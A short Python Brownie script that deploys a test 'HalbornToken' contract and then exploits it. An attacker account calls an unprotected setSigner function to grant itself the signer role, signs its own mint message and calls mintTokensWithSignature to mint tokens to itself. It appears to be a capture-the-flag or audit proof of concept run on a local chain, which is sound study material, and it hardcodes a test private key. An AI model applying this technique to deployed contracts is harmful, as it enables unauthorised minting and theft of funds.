from brownie import HalbornToken, accounts
from eth_account.messages import encode_defunct
from web3 import Web3
from web3.auto import w3
import eth_abi


def main():
    ### get the vulnerable contract's "interface"
    steve = accounts[0]
    amount_to_mint = 10000000000000000000000
    random_merkle_tree_root_hash = (
        "0x87c2d362de99f75a4f2755cdaaad2d11bf6cc65dc71356593c445535ff28f43d"
    )

    halborn = HalbornToken.deploy(
        "Halborn Token",
        "HT",
        amount_to_mint,
        steve,
        random_merkle_tree_root_hash,
        {"from": steve},
    )

    ### adding an attacker account.
    ### We will need a private key, so let's use .add(private_key) this time.
    bad = accounts.add(
        "0xca751356c37a98109fd969d8e79b42d768587efc6ba35e878bc8c093ed95d8a9"
    )
    ### I know it's a bad idea, but let's store it here for convenience :)
    private_key = "0xca751356c37a98109fd969d8e79b42d768587efc6ba35e878bc8c093ed95d8a9"

    ### use vulnerable setSigner function to set a 'signer' role to the attacker's account
    halborn.setSigner(bad, {"from": bad})

    ### Next step is to encode, hash and sign the message:
    ### Here is what we need to hash:
    # bytes32 messageHash = keccak256(abi.encode(address(this), amount, msg.sender)

    ### abi_encode the message
    amount = 100000000000000000000
    abi_encoded_message = eth_abi.encode_abi(
        ["address", "uint256", "address"],
        [halborn.address, amount, bad.address],
    )

    ### keccak hash the abi_encoded message
    hashed_message = Web3.keccak(abi_encoded_message)

    ### encode this hash to sign the message
    message = encode_defunct(hashed_message)

    ### sign properly encoded message
    signed_message = w3.eth.account.sign_message(message, private_key=private_key)

    ### store the ECDSA r, s, v values in respective variables
    r = signed_message.r
    s = signed_message.s
    v = signed_message.v

    ### exploit the mintTokensWithSignature function
    halborn.mintTokensWithSignature(amount, r, s, v, {"from": bad})

    ### check the balance of bad account
    print("bad's account balance is " + str(halborn.balanceOf(bad)))
